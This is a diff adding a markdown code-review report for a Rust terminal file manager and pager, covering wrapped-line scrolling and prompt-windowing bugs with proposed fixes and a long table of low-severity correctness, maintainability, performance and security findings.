+`scroll_to_keep_visible` computes `bot = top + viewport_height` in logical-line units, but with `wrap: true` (the default for content pagers) the renderer (render.rs:157) fits fewer than `viewport_height` logical lines on screen — each wrapped line consumes multiple rows. Concrete failure: open a file whose lines wrap to ~3 rows each in a 40-row pager (~13 logical lines visible), press V at the top, hold j: once the cursor passes line ~13 it is below the viewport, yet `line >= bot` stays false until line 40, so no scroll happens — the visual cursor and the growing selection highlight are invisible for ~27 keypresses. The same logical-row assumption affects `placement_move` (selection.rs:127) and `scroll_to_match` (scroll_search.rs:296-311), where a match placed `viewport/3` logical lines from the top can land below the fold when lines wrap more than ~3×. (Pickers are unaffected because they set wrap=false; Block visual forces wrap off in render, but Line visual and placement keep wrap on.)
+
+**Fix:** When wrap is on and `last_body_w` is known, make `scroll_to_keep_visible` (and `scroll_to_match`) measure visibility in visual rows: sum `visual_rows` from `scroll` forward to find the actual last fully-visible logical line, and scroll until the cursor line's wrapped rows fit.
+
+### `src/ui/prompt.rs:69` — Prompt has no horizontal windowing — cursor and text go invisible once the buffer exceeds the terminal width
+`medium` · `correctness` · `ui-render` · **unverified**
+
+PromptLine::render builds one Line from mode_tag + prefix + the FULL buffer and renders it with a plain Paragraph (no .scroll(), no windowing around cursor_pos). The caller (src/app/render/inner.rs:220-228) passes the raw `p.buffer` and the editor's char-index cursor. Paragraph clips at the area's right edge, so as soon as `prefix + buffer` is wider than the prompt row — e.g. pasting a long shell command into the `!`/`;`/`:` prompt, or typing past the edge on a narrow split — everything past the right edge, including the cursor cell, is simply not drawn. The user keeps typing/editing blind: insert-mode appends, vi `$`/`A`, and history entries longer than the screen are all invisible, with no indication anything is there.
+
+**Fix:** Window the buffer around the cursor before building spans: compute the available width (area.width minus mode-tag and prefix widths) and render a display-width-aware slice of the buffer that keeps cursor_pos in view (the classic left-anchor scroll-offset for single-line editors), optionally with `<`/`>` overflow markers. Add a TestBackend test with a buffer wider than the area asserting the cursor cell is visible.
+
+## Low severity
+
+| Where | Title | Lens | Status |
+|---|---|---|---|
+| `src/agent/resume.rs:224` | Claude resume token from untrusted pane scrollback is stored unvalidated in the non-UUID branch | security | unverified |
+| `src/app/bootstrap.rs:36` | Double-failure startup flash concatenates two error messages with no separator | correctness | confirmed |
+| `src/app/commands.rs:164` | Five copies of the same numeric-task-id argument parser | maintainability | confirmed |
+| `src/app/effect.rs:37` | #[non_exhaustive] on Effect is a no-op in this single-crate binary, with a stale justifying comment | maintainability | confirmed |
+| `src/app/find_picker.rs:176` | handle_find_picker_key's bool return and "caller skips dispatch" doc are stale since the route_input migration | maintainability | confirmed |
+| `src/app/git_view_session.rs:182` | git-view `\|` layout toggle replaces `view.lines` without clamping `view.scroll`, blanking the viewport when deep-scrolled | correctness | confirmed |
+| `src/app/graveyard.rs:48` | Graveyard `dd` arming is not cleared by j/k, contradicting the documented contract and enabling a surprise purge | correctness | confirmed |
+| `src/app/key_dispatch/prompts.rs:71` | Dead `_kind` discriminant computed in the simple-prompt Tab path | maintainability | confirmed |
+| `src/app/key_dispatch/prompts.rs:283` | History-popup escape paths bypass cancel_prompt, leaking Tab-applied filter and stale tab_state | correctness | confirmed |
+| `src/app/loop_steps.rs:131` | Activity monitor: ~27 flat activity_* fields on ViewState with four hand-maintained parallel lists | maintainability | confirmed |
+| `src/app/mcp.rs:96` | write_context serializes the full context twice per call (dedup compare + actual write) | perf | confirmed |
+| `src/app/mod.rs:118` | Message::AgentStatusReady doc contradicts where the agent-status apply actually happens | maintainability | confirmed |
+| `src/app/mod.rs:491` | Dead ViewState field: pending_overlay_close is never set true | maintainability | confirmed |
+| `src/app/mod.rs:849` | Matcher::matches allocates a lowercased String per candidate name — O(n) allocation churn per filter/search pass | perf | confirmed |
+| `src/app/pager_handler/mod.rs:154` | close_pane_scroll_pager doc claims callers that don't exist | maintainability | confirmed |
+| `src/app/pager_handler/mod.rs:331` | Stale comment: rename "queued for the folding work in v1.50.73" never happened | maintainability | confirmed |
+| `src/app/pager_handler/modes.rs:119` | Jump buffer state mirrored in ViewState and PagerView, hand-synced at eight sites | maintainability | confirmed |
+| `src/app/pager_handler/modes.rs:143` | `:N` jump past end-of-file blanks the entire pager viewport | correctness | confirmed |
+| `src/app/pager_handler/modes.rs:178` | handle_pager_bracket: '[' and ']' arms are 15-line mirror copies | maintainability | confirmed |
+| `src/app/pager_handler/motion.rs:158` | `f` (toggle full-width) on a git-view pager does not re-render the fixed-width rows at the new width | correctness | confirmed |
+| `src/app/pane_scroll.rs:86` | Parked pager streams leak when their tab is closed or demoted | correctness | confirmed |
+| `src/app/pane_tabs.rs:4` | pane_tabs.rs module doc claims every method is pub, contradicted by the file's own contents | maintainability | confirmed |
+| `src/app/pane_tabs.rs:262` | restart_active_tab flashes success even when the respawn failed (after already destroying the old tab) | correctness | confirmed |
+| `src/app/pane_tabs.rs:346` | :dump-scrollback writes pane contents to a fixed, predictable, symlink-followed path in /tmp | security | confirmed |
+| `src/app/pane_wake.rs:44` | Wake-builder doc comments assert a safety net (poll floor / MAX_IDLE_CAP) that no longer exists | maintainability | confirmed |
+| `src/app/prompt.rs:29` | Stale #[allow(dead_code)] on Prompt::editor and stale RemoveConfirm doc | maintainability | confirmed |
+| `src/app/prompt.rs:231` | "matches + Tab to cycle" flash formatting copy-pasted three times in one file | maintainability | confirmed |
+| `src/app/render/chrome.rs:76` | Stale comment: 're-borrow mut to fetch the live cwd' in a &self render method | maintainability | confirmed |
+| `src/app/render/inner.rs:214` | Dead bottom_pane_rect binding kept alive by a comment that no longer holds | maintainability | confirmed |
+| `src/app/render/overlays.rs:215` | Activity HUD reads env vars and process id every frame inside the render pass | maintainability | confirmed |
+| `src/app/run.rs:416` | run_teardown is skipped on every abnormal exit path (reader death, handler errors) | correctness | confirmed |
+| `src/app/run.rs:543` | Garbled, self-contradicting stale comment block about the removed poll floor | maintainability | confirmed |
+| `src/app/run.rs:598` | Scroll-throttle Continue drops a consumed needs_full_repaint clear, leaving stale cells | correctness | confirmed |
+| `src/app/session.rs:288` | restore_session arms /resume injection on the wrong tab (and misaligns labels) when a tab spawn fails | correctness | confirmed |
+| `src/app/sources.rs:91` | coalesce_recv repeats the identical coalesce-and-synthesize-Timeout tail in five match arms | maintainability | confirmed |
+| `src/app/state/apply.rs:73` | HOME resolved from raw process env, bypassing :setenv overrides honored elsewhere | correctness | confirmed |
+| `src/app/state/apply.rs:95` | Take success/error classified by string-prefix match on the flash message | maintainability | confirmed |
+| `src/app/state/dispatch.rs:66` | HOME read bypasses envset in :cd and gh, inconsistent with StartShell in the same producers | maintainability | confirmed |
+| `src/app/state/dispatch.rs:236` | Sort-apply logic triplicated across :sort reverse, :sort <mode>, and :set sort= | maintainability | confirmed |
+| `src/app/state/dispatch.rs:280` | Invalid glob in the pick-pattern prompt is silently swallowed | correctness | confirmed |
+| `src/app/state/mod.rs:153` | PagerLines is a single-variant enum that every consumer irrefutably destructures | maintainability | confirmed |
+| `src/app/streaming.rs:146` | drain_pending_capture hand-rolls a human-duration formatter that duplicates util::format_uptime | maintainability | confirmed |
+| `src/app/tasks.rs:27` | TaskStatus::Killed is a dead variant for a feature that never landed; the dead_code allow on Crashed is stale | maintainability | confirmed |
+| `src/app/tasks.rs:560` | Task exit-status glyph/text formatting and the strip_crlf+into_text rebuild are triplicated | maintainability | confirmed |
+| `src/app/util.rs:193` | hostname resolved by fork-execing the hostname binary instead of a syscall/crate | maintainability | confirmed |
+| `src/config/dsl.rs:27` | DSL header doc contradicts the parser: enter/display swapped, 'previous' is cursor-up not search-prev, and newer verbs are missing | maintainability | unverified |
+| `src/config/dsl.rs:138` | DSL action names contradict the documented grammar: `previous` means cursor-up, `enter` opens the editor, and SearchPrev is unbindable | correctness | unverified |
+| `src/config/mod.rs:274` | relax_search / relax_prompt are parsed, explicitly discarded, and referenced nowhere else | maintainability | unverified |
+| `src/config/mod.rs:353` | merge_file hand-lists all 23 color fields — adding a color requires a parallel edit or it silently never merges | maintainability | unverified |
+| `src/config/mod.rs:431` | Bad `[[scan.patterns]]` regex is dropped with a warning only visible under --debug | correctness | unverified |
+| `src/debug_log.rs:37` | Debug log created world-readable at a predictable /tmp path | security | unverified |
+| `src/debug_log.rs:56` | spyc_debug! formats its message and locks a global Mutex even when debug logging is disabled, on per-wake/per-fs-event hot paths | perf | confirmed |
+| `src/fs/entry.rs:57` | Dead code hidden behind #[allow(dead_code)]: Entry::is_dir, Listing::is_empty, Listing::len | maintainability | unverified |
+| `src/fs/finder.rs:72` | Nested-repo pass 2 is skipped in git worktrees (.git is a file, not a dir) | correctness | unverified |
+| `src/fs/grep.rs:272` | sanitize_line passes C1 control characters (incl. U+009B CSI) despite claiming to neutralize control bytes | security | unverified |
+| `src/fs/long_listing.rs:274` | is_exec and the dir-slash/exec-star display logic duplicate fs/entry.rs | maintainability | unverified |
+| `src/fs/long_listing.rs:308` | kind_char renders FIFOs, sockets, and device nodes as regular files | correctness | unverified |
+| `src/fs/ops.rs:1` | ops.rs module doc no longer describes the file — half of it is read-side viewer helpers | maintainability | unverified |
+| `src/fs/ops.rs:70` | Hardcoded EXDEV errno is obsolete — io::ErrorKind::CrossesDevices is stable under the crate's MSRV | maintainability | unverified |
+| `src/fs/ops.rs:274` | Handrolled magic-byte table where the zero-dependency `infer` crate fits the owner's crate-over-handroll preference | maintainability | unverified |
+| `src/fs/ops.rs:330` | hex_dump_lines relies on a single read() filling the buffer and flags exactly-64KiB files as truncated | correctness | unverified |
+| `src/fs/ops.rs:359` | hex_dump_lines re-parses pretty_hex's string output and pulls ui::theme/ratatui into the fs layer | maintainability | unverified |
+| `src/git/diff_model/blob.rs:57` | format_git_time_pub is a redundant visibility wrapper with a duplicated doc comment | maintainability | unverified |
+| `src/git/diff_model/blob.rs:101` | Diff resource errors render as an empty (clean-looking) file diff | correctness | unverified |
+| `src/git/diff_model/mod.rs:85` | diff_head_to_worktree does a root-down tree lookup per changed path — O(N x depth) tree decodes | perf | unverified |
+| `src/git/discovery.rs:34` | head_branch gix::open runs on every fs-event refresh and chdir, not only at repo change as the hot-path doc claims | perf | unverified |
+| `src/git/discovery.rs:51` | Five near-identical run_git test fixtures; the two older copies lack the CWD-thrash hardening the newer copies were written to fix | maintainability | unverified |
+| `src/git/status.rs:121` | map_to_listing rebuilds the loop-invariant prefix string for every status entry | maintainability | unverified |
+| `src/keymap/action.rs:115` | ResumePane comment says F11; the actual binding is F9 | maintainability | unverified |
+| `src/keymap/mod.rs:3` | Module doc promises features as future work that shipped long ago | maintainability | unverified |
+| `src/keymap/resolver/mod.rs:364` | Count-prefix accumulation overflows u32 — panic in debug builds, silent wrap in release | correctness | unverified |
+| `src/keymap/user.rs:117` | BoundAction::Copy / BoundAction::Move are unconstructable — dead variants with live-looking dispatch arms | maintainability | unverified |
+| `src/mcp/config.rs:152` | Takeover/detection logic duplicated between the .mcp.json and codex config.toml paths | maintainability | unverified |
+| `src/mcp/config.rs:207` | .mcp.json written non-atomically while MCP clients may be reading it | correctness | unverified |
+| `src/mcp/server.rs:112` | Planted .spyc-context-<pid>.json markers in a cloned repo defeat the documented cross-project attachment refusal | security | unverified |
+| `src/mcp/server.rs:158` | run_direct round-trips through Content-Length framing it immediately strips by string search | maintainability | unverified |
+| `src/mcp/server.rs:309` | Accept loop hot-spins on persistent accept errors (e.g. EMFILE) | correctness | unverified |
+| `src/pane/input.rs:68` | encode_key drops Ctrl/Alt/Shift modifiers on arrows, Home/End, Delete — modified-arrow keys silently degrade in pane apps | correctness | confirmed |
+| `src/pane/mod.rs:174` | If the parser worker thread ever panics, take_host loses the byte receiver: demoted task hangs silently, and a later Pane::adopt panics on expect | correctness | unverified |
+| `src/pane/mod.rs:498` | Pane::save_to_file is blocking file IO called inline from three handlers, each duplicating the flash handling | maintainability | unverified |
+| `src/pane/mod.rs:579` | SPYC_PTY_DEBUG byte-dump block copy-pasted between parser_worker and PtyHost::drain | maintainability | unverified |
+| `src/pane/pathref.rs:73` | gcc/clang-style diagnostics with trailing colon ('file.c:3:7: error: ...') defeat split_path_line — gf misses the path | correctness | confirmed |
+| `src/pane/tabs.rs:264` | Blanket #[allow(dead_code)] on impl PaneTabs hides genuinely dead remove_closed() | maintainability | unverified |
+| `src/pane/tabs.rs:470` | Tab close runs a synchronous SIGTERM-grace-SIGKILL loop on the input thread (20-250 ms freeze per tab) | perf | unverified |
+| `src/pane/tabs.rs:503` | take_active duplicates remove_at's index fixup, including a branch that can never execute | maintainability | confirmed |
+| `src/paths.rs:60` | `expand_tilde` mangles `~user` paths into `$HOME/user` | correctness | unverified |
+| `src/shell/expand.rs:33` | expand_percent lossy UTF-8 conversion can make `%` target a different file than selected | security | unverified |
+| `src/state/claude_transcript.rs:65` | Transcript renderers duplicate the push_blank closure and the user-prompt rendering loop across claude/codex/agy | maintainability | unverified |
+| `src/state/cursor.rs:1` | Cursor doc comment describes a grid-width field that no longer exists | maintainability | unverified |
+| `src/state/inventory.rs:34` | Inventory items doc comment says "ordered by original path" but the BTreeMap is keyed by UUIDv7 id (time order) | maintainability | unverified |
+| `src/state/marks.rs:57` | save() comment claims "atomically-ish" but the write is a plain fs::write; same non-atomic pattern across all state saves | maintainability | unverified |
+| `src/state/marks.rs:67` | State files are written non-atomically; a torn write silently erases all marks on next load | correctness | unverified |
+| `src/state/mod.rs:89` | read_tail_lossy drops a whole valid line when the seek lands exactly on a line boundary | correctness | unverified |
+| `src/state/sessions/mod.rs:273` | find_claude_session_name_public is a pointless pub passthrough wrapper | maintainability | unverified |
+| `src/state/sessions/mod.rs:617` | Three near-duplicate resume-token extractors (claude/codex/agy) copy the same reverse-scan/find/next-token/validate block four times | maintainability | unverified |
+| `src/ui/diff_render/mod.rs:221` | render_file_unified and render_file_split duplicate their entire prologue | maintainability | unverified |
+| `src/ui/diff_render/mod.rs:345` | Side-by-side line-number field overflows at 5+ digit line numbers, breaking column alignment | correctness | unverified |
+| `src/ui/help.rs:449` | wrap_description reimplements the word-wrap already in markdown/wrap.rs | maintainability | unverified |
+| `src/ui/line_edit.rs:63` | Stale pending_op survives history navigation and set_content — next motion key silently deletes text | correctness | unverified |
+| `src/ui/line_edit.rs:253` | Normal mode ignores the CONTROL modifier — ^A enters Insert mode, ^D arms the delete operator | correctness | unverified |
+| `src/ui/markdown/mod.rs:141` | TableBuilder.alignments is parsed but never used (dead field) | maintainability | unverified |
+| `src/ui/markdown/renderer.rs:383` | style_mods is a bitflag, not a nesting counter — bold inside a heading un-bolds the rest of the heading | correctness | unverified |
+| `src/ui/pager/construct.rs:154` | picker_move re-implements scroll_to_keep_visible; placement_move re-inlines placement_row_len | maintainability | unverified |
+| `src/ui/pager/layout.rs:40` | u16 multiply overflow in centered geometry for terminals wider than 728 columns | correctness | unverified |
+| `src/ui/pager/layout.rs:104` | last_word_start is a verbatim duplicate of prev_word_start called at end-of-line | maintainability | unverified |
+| `src/ui/pager/layout.rs:292` | centered_rect / centered_body_width overflow u16 on terminals wider than 728 columns | perf | unverified |
+| `src/ui/pager/render.rs:25` | Position indicator and title strings computed unconditionally but dead in borderless mode (and use a viewport off by 2 there) | maintainability | unverified |
+| `src/ui/pager/render.rs:249` | Multi-column mode recomputes partition_lines_static up to 3x per keystroke (render, position indicator, clamp) | perf | unverified |
+| `src/ui/pager/render.rs:367` | Two near-identical cursor-cell splitting blocks in apply_row_styling; both discard per-span styling on the cursor row | maintainability | unverified |
+| `src/ui/pager/scroll_search.rs:222` | commit_search allocates two Strings per line over the entire buffer | perf | unverified |
+| `src/ui/scrollback.rs:178` | trim_trailing_whitespace_run drops styled (bg/reverse) space runs, truncating TUI color bars in the ^a-v pager | correctness | unverified |
+| `src/ui/theme.rs:210` | Doc comment references src/ui/diff_render.rs, which no longer exists | maintainability | unverified |
